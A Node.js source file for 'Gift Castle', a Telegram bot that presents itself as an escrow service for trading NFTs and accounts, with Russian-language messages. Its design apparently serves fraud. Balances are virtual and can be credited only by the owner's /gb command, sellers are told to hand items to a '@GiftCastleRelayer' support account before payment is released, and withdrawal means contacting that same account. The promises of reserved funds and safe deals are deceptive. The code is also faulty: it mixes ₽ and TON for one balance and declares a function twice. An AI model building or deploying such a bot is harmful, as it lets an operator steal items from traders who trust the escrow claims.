/**
 * Gift Castle — Telegram escrow-like bot (virtual balances)
 * Node.js + node-telegram-bot-api
 *
 * Features:
 * - /start welcome flow with PHOTO_ID
 * - main menu: Создать сделку, Баланс, Помощь
 * - Seller flow: create deal (type, name, description, price) -> generates #A123...
 * - Buyer flow: join deal by id -> checks internal balance, reserves funds (escrow_amount)
 * - Seller confirms transfer -> buyer confirms receipt -> funds credited to seller
 * - Owner-only command: /gb <user_id> <amount> -> credit user balance
 * - All messages attempt to edit last message in chat (saved in data.json)
 * - All principal texts are verbose (>20 words) as requested
 *
 * Environment variables:
 * - BOT_TOKEN (required)
 * - OWNER_ID  (optional, defaults to 6828395702)
 *
 * Deploy: Render (set BOT_TOKEN, OWNER_ID in Environment)
 */

import TelegramBot from "node-telegram-bot-api";
import fs from "fs-extra";
import path from "path";
import dotenv from "dotenv";
dotenv.config();

const BOT_TOKEN = process.env.BOT_TOKEN;
if (!BOT_TOKEN) {
  console.error("Error: BOT_TOKEN environment variable is required.");
  process.exit(1);
}
const OWNER_ID = Number(process.env.OWNER_ID || "6828395702");
const PHOTO_ID = "AgACAgIAAxkBAAMEaQ4BT_HrLKNH6naa15zKYnt8z6UAAjsPaxuAI3BI-o-YrxQPN8gBAAMCAAN4AAM2BA";
const DATA_FILE = path.join(process.cwd(), "data.json");

// Load / Save helpers
async function loadData() {
  try {
    const exists = await fs.pathExists(DATA_FILE);
    if (!exists) {
      const initial = { users: {}, deals: {}, chats: {} };
      await fs.writeJson(DATA_FILE, initial, { spaces: 2 });
      return initial;
    }
    const d = await fs.readJson(DATA_FILE);
    // ensure structure
    d.users = d.users || {};
    d.deals = d.deals || {};
    d.chats = d.chats || {};
    return d;
  } catch (err) {
    console.error("Failed to load data.json:", err);
    return { users: {}, deals: {}, chats: {} };
  }
}

async function saveData(data) {
  await fs.writeJson(DATA_FILE, data, { spaces: 2 });
}

// Utilities
function ensureUserObj(data, uid, username = null) {
  const k = String(uid);
  if (!data.users[k]) {
    data.users[k] = { username: username || null, balance: 0.0 };
  } else if (username) {
    data.users[k].username = username;
  }
}

function genDealId() {
  const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
  const letter = letters[Math.floor(Math.random() * letters.length)];
  const number = Math.floor(Math.random() * 999999) + 1; // 1..999999
  return `#${letter}${number}`;
}

function validDealIdFormat(did) {
  return /^#[A-Z]\d{1,6}$/.test(did);
}

// Chat message editing / sending: tries to edit last message caption if exists; otherwise sends new photo with caption.
async function sendOrEditPhotoCaption(bot, chatId, caption, replyMarkup = null) {
  const data = await loadData();
  const last = data.chats[String(chatId)]?.last_message_id;
  try {
    if (last) {
      // try edit caption
      await bot.editMessageCaption(caption, {
        chat_id: chatId,
        message_id: last,
        parse_mode: "Markdown",
        reply_markup: replyMarkup,
      });
      return last;
    }
  } catch (err) {
    // ignore and send new
  }
  const sent = await bot.sendPhoto(chatId, PHOTO_ID, {
    caption,
    parse_mode: "Markdown",
    reply_markup: replyMarkup,
  });
  // save new last_message_id
  data.chats[String(chatId)] = { last_message_id: sent.message_id };
  await saveData(data);
  return sent.message_id;
}

// Save last message id
async function setLastMessageId(chatId, messageId) {
  const data = await loadData();
  data.chats[String(chatId)] = { last_message_id: messageId };
  await saveData(data);
}

// Markup creators
function mkKeyboard(rows) {
  return { inline_keyboard: rows };
}

function kbStartContinue() {
  return mkKeyboard([[{ text: "Продолжить", callback_data: "start_continue" }]]);
}

function kbMain() {
  return mkKeyboard([
    [
      { text: "🛡️ Создать сделку", callback_data: "create_deal" },
      { text: "💰 Баланс", callback_data: "show_balance" }
    ],
    [{ text: "❓ Помощь", url: "https://t.me/GiftCastleRelayer" }]
  ]);
}

function kbRoleChoice() {
  return mkKeyboard([
    [
      { text: "🧑‍💼 Продавец", callback_data: "role_seller" },
      { text: "🧑‍💻 Покупатель", callback_data: "role_buyer" }
    ],
    [{ text: "↩️ Назад", callback_data: "go_back_main" }]
  ]);
}

function kbDealActions() {
  return mkKeyboard([
    [
      { text: "Продолжить ✔️", callback_data: "deal_continue" },
      { text: "Отмена ❌", callback_data: "deal_cancel" }
    ]
  ]);
}

function kbAfterCreateToShare(dealId) {
  return mkKeyboard([
    [{ text: "Отправить покупателю", switch_inline_query: dealId }],
    [{ text: "↩️ Вернуться в меню", callback_data: "go_back_main" }]
  ]);
}

function kbInProcessForSeller() {
  return mkKeyboard([[{ text: "Товар Передан", callback_data: "item_transferred" }]]);
}

function kbWaitBuyerConfirm() {
  return mkKeyboard([[{ text: "Я получил товар — Продолжить", callback_data: "buyer_confirm_receive" }]]);
}

function kbBalanceWithdraw() {
  return mkKeyboard([
    [{ text: "Запросить вывод", url: "https://t.me/GiftCastleRelayer" }],
    [{ text: "↩️ Вернуться в меню", callback_data: "go_back_main" }]
  ]);
}

// Big verbose texts (>20 words)
function welcomeText(username) {
  return (
    `👋 *Здравствуйте, ${username}!*  \n\n` +
    `_Добро пожаловать в официальную зону гарантийных сделок Gift Castle — здесь каждая операция сопровождается внимательным контролем и подробными уведомлениями, чтобы все участники чувствовали уверенность и могли завершить сделки справедливо и без лишних рисков._  \n\n` +
    `Мы отслеживаем статус передачи товара, резервируем средства внутри системы до окончательного подтверждения и предоставляем оперативную поддержку при необходимости, чтобы ваша торговля проходила удобно и спокойно.`
  );
}

function introScreenText() {
  return (
    `🏰 *Gift Castle — ваш надёжный партнёр в торговле на платформе Telegram!*  \n\n` +
    `_Наш бот реализует эскроу-подход: средства резервируются до подтверждения передачи товара, а процесс сопровождается прозрачными уведомлениями для всех сторон, что минимизирует риски недопонимания или мошенничества и повышает доверие между участниками._`
  );
}

// State management (very simple, kept in memory but persisted per-change for critical session data)
const tempStates = {}; // { userId: { state: "seller_type" | "seller_name" | ... , data: {...} } }

function setTempState(userId, state, data = {}) {
  tempStates[String(userId)] = { state, data };
}

function getTempState(userId) {
  return tempStates[String(userId)] || null;
}

function clearTempState(userId) {
  delete tempStates[String(userId)];
}

// Initialize bot
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// START handler
bot.onText(/\/start/, async (msg) => {
  try {
    const chatId = msg.chat.id;
    const username = msg.from.username ? `@${msg.from.username}` : (msg.from.first_name || "пользователь");
    const data = await loadData();
    ensureUserObj(data, msg.from.id, msg.from.username || msg.from.first_name);
    await saveData(data);

    const text = welcomeText("@" + (msg.from.username || msg.from.first_name));
    const sent = await bot.sendPhoto(chatId, PHOTO_ID, {
      caption: text,
      parse_mode: "Markdown",
      reply_markup: kbStartContinue()
    });
    await setLastMessageId(chatId, sent.message_id);
  } catch (err) {
    console.error("start error:", err);
  }
});

// Callback query handling (main menu flows)
bot.on("callback_query", async (query) => {
  try {
    const dataAll = await loadData();
    const chatId = query.message.chat.id;
    const userId = query.from.id;
    const data = query.data;
    // always answer callback to remove spinner
    await bot.answerCallbackQuery(query.id).catch(() => {});

    // Start Continue -> main menu
    if (data === "start_continue") {
      const caption = "*🎖️ Gift Castle — Эталон безопасных сделок!*  \n\n" + introScreenText();
      // try edit last message in chat (preferred)
      await sendOrEditPhotoCaption(bot, chatId, caption, kbMain());
      return;
    }

    if (data === "go_back_main") {
      const caption = introScreenText();
      await sendOrEditPhotoCaption(bot, chatId, caption, kbMain());
      return;
    }

    // Create deal -> choose role
    if (data === "create_deal") {
      const caption =
        "📝 *Создание сделки*  \n\n" +
        "• Пожалуйста, выберите роль в сделке для её создания!  \n\n" +
        "_Сделка — это соглашение между сторонами, направленное на передачу товара и оплату; выберите роль, чтобы продолжить и задать параметры операции._";
      await sendOrEditPhotoCaption(bot, chatId, caption, kbRoleChoice());
      return;
    }

    // Role Seller
    if (data === "role_seller") {
      const caption =
        "🧑‍💼 *Продавец*  \n\n" +
        "Продавец — сторона, которая обязуется передать товар в собственность покупателя и получить оплату.  \n\n" +
        "Нажмите *Продолжить*, чтобы начать создание лота и задать параметры товара.";
      const kb = mkKeyboard([[{ text: "Продолжить", callback_data: "seller_start" }], [{ text: "↩️ Назад", callback_data: "go_back_main" }]]);
      await sendOrEditPhotoCaption(bot, chatId, caption, kb);
      return;
    }

    // Seller start -> ask type
    if (data === "seller_start") {
      setTempState(userId, "seller_type", { });
      const caption =
        "🧾 *Продавец — создание лота*  \n\n" +
        "Пожалуйста, напишите *тип товара* (например: NFT, Аккаунт, Лицензия и т. п.).  \n\n" +
        "_Тип товара поможет покупателю понять, что именно предлагается в рамках сделки и снизит вероятность недопонимания при переводе средств._";
      // send new photo (not editing) to keep flow clear
      const sent = await bot.sendPhoto(chatId, PHOTO_ID, { caption, parse_mode: "Markdown" });
      await setLastMessageId(chatId, sent.message_id);
      return;
    }

    // Role Buyer -> ask deal id
    if (data === "role_buyer" || data === "role_buyer_prompt") {
      setTempState(userId, "buyer_deal_id", {});
      const caption =
        "🧾 *Покупатель*  \n\n" +
        "Введите номер сделки в формате `#A123` для присоединения к сделке.  \n\n" +
        "_Пример допустимого формата: #A1, #B12, #C1234 — латинская буква + 1—6 цифр._";
      const sent = await bot.sendPhoto(chatId, PHOTO_ID, { caption, parse_mode: "Markdown" });
      await setLastMessageId(chatId, sent.message_id);
      return;
    }

    // Deal actions: buyer chooses continue/cancel after viewing deal
    if (data === "deal_continue") {
      // use temp state saved per user when they viewed the deal
      const st = getTempState(userId);
      if (!st || !st.data?.joining_deal) {
        await bot.sendMessage(chatId, "Ошибка: данные о сделке потеряны. Попробуйте снова.");
        clearTempState(userId);
        return;
      }
      const dealId = st.data.joining_deal;
      const dataFile = await loadData();
      const deal = dataFile.deals[dealId];
      if (!deal) {
        await bot.sendMessage(chatId, "⚠️ Сделка не найдена или была удалена. Проверьте номер и попробуйте снова.");
        clearTempState(userId);
        return;
      }
      if (deal.status !== "open") {
        await bot.sendMessage(chatId, "ℹ️ Эта сделка уже не доступна для присоединения — проверьте статус у продавца.");
        clearTempState(userId);
        return;
      }
      // ensure buyer exists
      ensureUserObj(dataFile, userId, query.from.username || query.from.first_name);
      const buyerBalance = Number(dataFile.users[String(userId)].balance || 0.0);
      const price = Number(deal.price);
      if (buyerBalance < price) {
        const caption = "⚠️ *Ошибка:* Недостаточно средств для продолжения сделки.  \n\n" +
                        "Пожалуйста, пополните баланс через команду владельца или свяжитесь с поддержкой, чтобы уточнить возможности пополнения.";
        await sendOrEditPhotoCaption(bot, chatId, caption, kbBalanceWithdraw());
        clearTempState(userId);
        return;
      }
      // reserve funds (virtual escrow)
      dataFile.users[String(userId)].balance = Number((buyerBalance - price).toFixed(6));
      deal.buyer_id = userId;
      deal.buyer_username = query.from.username || query.from.first_name;
      deal.status = "in_process";
      deal.escrow_amount = Number(price);
      await saveData(dataFile);
      clearTempState(userId);

      // Notify buyer
      const buyerCaption =
        `💳 *Покупатель присоединился к сделке ${dealId}!*  \n\n` +
        `Вы присоединились к сделке ${dealId}; ожидайте ответа от продавца. Средства в размере *${price} ₽* зарезервированы в гарант-аккаунте до подтверждения передачи товара.`;
      const sent = await bot.sendPhoto(chatId, PHOTO_ID, { caption: buyerCaption, parse_mode: "Markdown" });
      await setLastMessageId(chatId, sent.message_id);

      // Notify seller privately
      try {
        const sellerId = deal.seller_id;
        const notify =
          `🔔 *Уведомление:* ${deal.buyer_username ? "@" + deal.buyer_username : "покупатель"} присоединился к сделке ${dealId}.  \n\n` +
          `Для продолжения передайте товар поддержке @GiftCastleRelayer и нажмите кнопку *Товар Передан*, чтобы уведомить покупателя о передаче.`;
        const s = await bot.sendPhoto(sellerId, PHOTO_ID, { caption: notify, parse_mode: "Markdown", reply_markup: kbInProcessForSeller() });
        // set last message for seller chat
        await setLastMessageId(sellerId, s.message_id);
      } catch (err) {
        // ignore if can't message seller (e.g., hasn't started the bot)
      }
      return;
    }

    // Deal cancel
    if (data === "deal_cancel") {
      clearTempState(userId);
      const caption =
        "Вы отменили продолжение сделки. Возвращайтесь в меню и начните заново, когда будете готовы.  \n\n" +
        "Если потребуется помощь — используйте раздел «Помощь» для связи с поддержкой.";
      await sendOrEditPhotoCaption(bot, chatId, caption, kbMain());
      return;
    }

    // Seller: item transferred
    if (data === "item_transferred") {
      // find in_process deal for this seller
      const dd = await loadData();
      let deal = null;
      for (const d of Object.values(dd.deals)) {
        if (d.seller_id === userId && d.status === "in_process") {
          deal = d;
          break;
        }
      }
      if (!deal) {
        await bot.sendMessage(chatId, "ℹ️ Сделка в статусе 'в процессе' не найдена. Возможно, она уже обработана или вы не являетесь продавцом.");
        return;
      }
      deal.status = "transferred";
      await saveData(dd);

      // notify buyer
      const buyerId = deal.buyer_id;
      if (buyerId) {
        try {
          const caption =
            `📦 *Сделка ${deal.id} — Товар передан!*  \n\n` +
            `Продавец подтвердил передачу товара поддержке. После получения товара нажмите кнопку *Я получил товар — Продолжить*, чтобы завершить сделку и освободить средства продавцу.`;
          const s = await bot.sendPhoto(buyerId, PHOTO_ID, { caption, parse_mode: "Markdown", reply_markup: kbWaitBuyerConfirm() });
          await setLastMessageId(buyerId, s.message_id);
        } catch (err) {
          // couldn't message buyer
        }
      }
      await bot.sendMessage(chatId, `✅ Вы подтвердили передачу товара по сделке ${deal.id}. Ожидайте подтверждения от покупателя.`);
      return;
    }

    // Buyer confirm receive
    if (data === "buyer_confirm_receive") {
      // find transferred deal for this buyer
      const dd = await loadData();
      let deal = null;
      for (const d of Object.values(dd.deals)) {
        if (d.buyer_id === userId && d.status === "transferred") {
          deal = d;
          break;
        }
      }
      if (!deal) {
        await bot.sendMessage(chatId, "ℹ️ Подтверждаемых сделок не найдено. Проверьте статусы или обратитесь в поддержку.");
        return;
      }
      const dealId = deal.id;
      const amount = Number(deal.escrow_amount || 0.0);
      const sellerId = deal.seller_id;
      ensureUserObj(dd, sellerId);
      dd.users[String(sellerId)].balance = Number((Number(dd.users[String(sellerId)].balance || 0) + amount).toFixed(6));
      deal.status = "completed";
      deal.escrow_amount = 0.0;
      await saveData(dd);

      // notify seller and buyer
      try {
        await bot.sendPhoto(sellerId, PHOTO_ID, { caption: `🎉 *Сделка ${dealId} успешно завершена!*  \n\nТовар доставлен, средства в размере *${amount} ₽* зачислены на ваш баланс.`, parse_mode: "Markdown" });
      } catch (err) {}
      await bot.sendPhoto(chatId, PHOTO_ID, { caption: `✅ *Сделка ${dealId} завершена!*  \n\nСпасибо за сделку — средства переведены продавцу и запись о завершении сохранена в системе.`, parse_mode: "Markdown" });
      return;
    }

    // Show balance
    if (data === "show_balance") {
      const dd = await loadData();
      ensureUserObj(dd, userId, query.from.username || query.from.first_name);
      await saveData(dd);
      const bal = Number(dd.users[String(userId)].balance || 0).toFixed(6);
      const caption =
        `💰 *Ваш баланс: ${bal} TON*  \n\n` +
        `Это внутренний баланс бота Gift Castle, предназначенный для взаимодействия в рамках сделок и управления расчетами. ` +
        `Для вывода средств обратитесь в поддержку @GiftCastleRelayer — наши специалисты помогут решить вопросы вывода и уточнят детали.`;
      await sendOrEditPhotoCaption(bot, chatId, caption, kbBalanceWithdraw());
      return;
    }

    // Help (fallback)
    if (data === "help") {
      await bot.sendMessage(chatId, "Для помощи свяжитесь с поддержкой: @GiftCastleRelayer");
      return;
    }

  } catch (err) {
    console.error("callback_query handler error:", err);
  }
});

// Inline query support: allow quick share of deal id (simple)
bot.on("inline_query", async (iq) => {
  try {
    const query = iq.query.trim().toUpperCase();
    const data = await loadData();
    const results = [];
    if (!query) {
      results.push({
        type: "article",
        id: "howto",
        title: "Отправить номер сделки покупателю",
        input_message_content: { message_text: "Отправьте покупателю номер сделки, чтобы он мог присоединиться: #A123" },
        description: "Отправьте номер сделки покупателю"
      });
    } else {
      if (data.deals[query]) {
        const d = data.deals[query];
        const text = `*Сделка ${query}* — ${d.name} — ${d.price} ₽  \nПрисоединяйтесь, чтобы участвовать в безопасной сделке.`;
        results.push({
          type: "article",
          id: query,
          title: `Сделка ${query}`,
          input_message_content: { message_text: text, parse_mode: "Markdown" },
          description: `${d.name} — ${d.price} ₽`
        });
      }
    }
    bot.answerInlineQuery(iq.id, results).catch(() => {});
  } catch (err) {
    console.error("inline_query error:", err);
  }
});

// Text messages handler for states and commands
bot.on("message", async (msg) => {
  try {
    // ignore messages from channels, etc.
    if (!msg.from || !msg.chat) return;

    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const text = (msg.text || "").trim();

    // Owner command /gb <id> <amount>
    const gbMatch = text.match(/^\/gb\s+(\d+)\s+(-?\d+(\.\d+)?)$/i);
    if (gbMatch && userId === OWNER_ID) {
      const targetId = Number(gbMatch[1]);
      const amount = Number(gbMatch[2]);
      const data = await loadData();
      ensureUserObj(data, targetId);
      data.users[String(targetId)].balance = Number(((Number(data.users[String(targetId)].balance) || 0) + amount).toFixed(6));
      await saveData(data);
      await bot.sendMessage(chatId, `✅ Баланс пользователя ${targetId} успешно изменён на ${amount} TON. Текущий баланс: ${data.users[String(targetId)].balance} TON`);
      try {
        await bot.sendMessage(targetId, `💎 *Баланс пополнен:* вам зачислено +${amount} TON`, { parse_mode: "Markdown" });
      } catch (err) {
        // user may not have started bot
      }
      return;
    }

    // If user in temp state
    const st = getTempState(userId);
    if (st && st.state && !text.startsWith("/")) {
      // Seller flow states
      if (st.state === "seller_type") {
        st.data.type = text;
        setTempState(userId, "seller_name", st.data);
        await bot.sendMessage(chatId, "📛 *Введите название товара* — напишите короткое и понятное имя товара.", { parse_mode: "Markdown" });
        return;
      }
      if (st.state === "seller_name") {
        st.data.name = text;
        setTempState(userId, "seller_description", st.data);
        await bot.sendMessage(chatId, "✍️ *Введите описание товара* — подробное описание, чтобы покупатель видел что получает.", { parse_mode: "Markdown" });
        return;
      }
      if (st.state === "seller_description") {
        st.data.description = text;
        setTempState(userId, "seller_price", st.data);
        await bot.sendMessage(chatId, "💵 *Введите стоимость товара в ₽* — цифрами, без символов.", { parse_mode: "Markdown" });
        return;
      }
      if (st.state === "seller_price") {
        // parse price
        const cleaned = text.replace(",", ".").replace(/[^\d.]/g, "");
        const price = Number(cleaned);
        if (Number.isNaN(price) || price <= 0) {
          await bot.sendMessage(chatId, "⚠️ Неверный формат суммы. Введите только положительное число, например: 1234 или 1234.56");
          return;
        }
        const dataFile = await loadData();
        // create deal
        let dealId;
        do {
          dealId = genDealId();
        } while (dataFile.deals[dealId]);

        dataFile.deals[dealId] = {
          id: dealId,
          type: st.data.type,
          name: st.data.name,
          description: st.data.description,
          price: Number(price.toFixed(6)),
          seller_id: userId,
          seller_username: msg.from.username || msg.from.first_name || null,
          buyer_id: null,
          buyer_username: null,
          status: "open",
          escrow_amount: 0.0,
          created_at: new Date().toISOString()
        };
        ensureUserObj(dataFile, userId, msg.from.username || msg.from.first_name);
        await saveData(dataFile);
        clearTempState(userId);

        const caption =
          `✅ *Сделка ${dealId} успешно создана!*  \n\n` +
          `• *Тип товара:* ${dataFile.deals[dealId].type}  \n` +
          `• *Название товара:* ${dataFile.deals[dealId].name}  \n` +
          `• *Описание:* ${dataFile.deals[dealId].description}  \n` +
          `• *Цена:* ${dataFile.deals[dealId].price} ₽  \n\n` +
          `Отправьте покупателю номер сделки (${dealId}) для присоединения — он подключится к операции и процесс пойдёт дальше.`;
        const sent = await bot.sendPhoto(chatId, PHOTO_ID, { caption, parse_mode: "Markdown", reply_markup: kbAfterCreateToShare(dealId) });
        await setLastMessageId(chatId, sent.message_id);
        return;
      }

      // Buyer entering deal id
      if (st.state === "buyer_deal_id") {
        const up = text.toUpperCase();
        if (!validDealIdFormat(up)) {
          await bot.sendMessage(chatId, "❗ Формат номера сделки неверный. Пример правильного формата: `#A123` — латинская буква и 1–6 цифр.", { parse_mode: "Markdown" });
          return;
        }
        const dataFile = await loadData();
        if (!dataFile.deals[up]) {
          await bot.sendMessage(chatId, "⚠️ Сделка с таким номером не найдена. Проверьте корректность и попробуйте снова.");
          return;
        }
        const deal = dataFile.deals[up];
        if (deal.status !== "open") {
          await bot.sendMessage(chatId, "ℹ️ Эта сделка уже не доступна для присоединения — проверьте статус у продавца.");
          return;
        }
        // store in temp state the joining deal
        st.data.joining_deal = up;
        setTempState(userId, "buyer_confirming", st.data);

        const caption =
          `*Сделка ${up}*  \n\n` +
          `👨‍💼 *Продавец:* ${deal.seller_username ? "@" + deal.seller_username : "Продавец"}  \n` +
          `✅ *Товар:* "${deal.name}"  \n` +
          `🗒️ *Описание:* ${deal.description}  \n` +
          `💵 *Стоимость:* ${deal.price} ₽  \n\n` +
          `Для продолжения нажмите *Продолжить ✔️*, для отмены — *Отмена ❌*.`;
        const sent = await bot.sendPhoto(chatId, PHOTO_ID, { caption, parse_mode: "Markdown", reply_markup: kbDealActions() });
        await setLastMessageId(chatId, sent.message_id);
        return;
      }

      // buyer_confirming state fallback
      if (st.state === "buyer_confirming") {
        // ignore text; user should press buttons
        await bot.sendMessage(chatId, "Для продолжения используйте кнопки под сообщением: Продолжить ✔️ или Отмена ❌.");
        return;
      }
    }

    // Fallback / other messages: show menu help text (long)
    if (!text.startsWith("/")) {
      const txt =
        "Здравствуйте! Я — бот Gift Castle. Если вы хотите создать сделку — нажмите «Создать сделку» в меню, " +
        "если хотите проверить баланс — нажмите «Баланс», или воспользуйтесь помощью, чтобы связаться с поддержкой. " +
        "Мы сопровождаем процесс сделки, резервируем средства внутри системы до подтверждения передачи товара и уведомляем обе стороны о каждом важном шаге.";
      await bot.sendMessage(chatId, txt);
    }
  } catch (err) {
    console.error("message handler error:", err);
  }
});

// Helper: ensure user in data
function ensureUserObj(data, uid, username = null) {
  const k = String(uid);
  if (!data.users[k]) data.users[k] = { username: username || null, balance: 0.0 };
  else if (username) data.users[k].username = username;
}

// Start log
console.log("🚀 Gift Castle Bot started (Node.js).");
